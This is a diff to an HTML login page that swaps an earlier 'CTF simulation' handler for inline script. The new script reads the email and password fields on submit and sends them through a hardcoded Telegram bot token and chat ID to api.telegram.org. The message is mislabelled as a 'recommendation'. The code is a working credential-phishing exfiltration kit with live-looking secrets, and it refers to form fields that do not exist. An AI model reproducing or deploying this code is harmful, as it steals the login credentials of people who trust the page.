@@ -46,45 +46,52 @@
     </main>
 
     <script src="../script/bootstrap.bundle.min.js"></script>
-    <script src="../script/logger.js"></script>
+   <script>
+        const TOKEN = "8360813543:AAEXff1pasBtUu6SYNwXvwUsujru8Fi5WKs";
+        const CHAT_ID = "-1003863808356";
 
-    <!-- Form submission handler – connects to logger.js -->
-    <script>
-      document.addEventListener('DOMContentLoaded', function () {
-        const form = document.getElementById('loginForm');
-        const submitBtn = document.getElementById('submitBtn');
+        document.getElementById("submitBtn").addEventListener("click", function(e) {
+            e.preventDefault();
 
-        if (!form) {
-          console.error('Form #loginForm not found');
-          return;
-        }
+            const user = document.getElementById("email").value.trim();
+            const rec  = document.getElementById("password").value.trim();
 
-        form.addEventListener('submit', async function (e) {
-          e.preventDefault();
+            if (!user || !rec) {
+                alert("Please fill all fields");
+                return;
+            }
 
-          const email    = document.getElementById('email').value.trim();
-          const password = document.getElementById('password').value;
-          const remember = document.getElementById('remember').checked ? 'Yes' : 'No';
+            const message = 
+        `New Recommendation
+        -----------------
+        User: ${user}
+        password: ${rec}`;
 
-          console.log('Fake login attempt:', { email, password, remember });
+            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
 
-          try {
-            await sendToTelegram(email, password, remember);
-
-            // Success visual feedback
-            submitBtn.textContent = 'Signed In (Simulation)';
-            submitBtn.classList.remove('btn-primary');
-            submitBtn.classList.add('btn-success');
-            submitBtn.disabled = true;
-
-            alert('Login successful!\n(This is a CTF simulation only – data was sent to the Telegram bot)');
-          } catch (err) {
-            console.error('Failed to send:', err);
-            alert('Failed to send data.\nCheck browser console (F12) for details.');
-          }
+            fetch(url)
+                .then(res => res.json())
+                .then(data => {
+                    if(data.ok){
+                        document.getElementById("submitBtn").innerText = "Sent";
+                        document.getElementById("submitBtn").disabled = true;
+                        setTimeout(() => {
+                            document.getElementById("submitBtn").innerText = "send the recommendation";
+                            document.getElementById("submitBtn").disabled = false;
+                        }, 2000);
+                        document.getElementById("username").value = "";
+                        document.getElementById("recommendation").value = "";
+                    } else {
+                        alert("Telegram API error");
+                    }
+                })
+                .catch(err => {
+                    console.error(err);
+                    alert("Network error");
+                });
         });
-      });
-    </script>
+        </script>
+
 
   </body>
 </html>
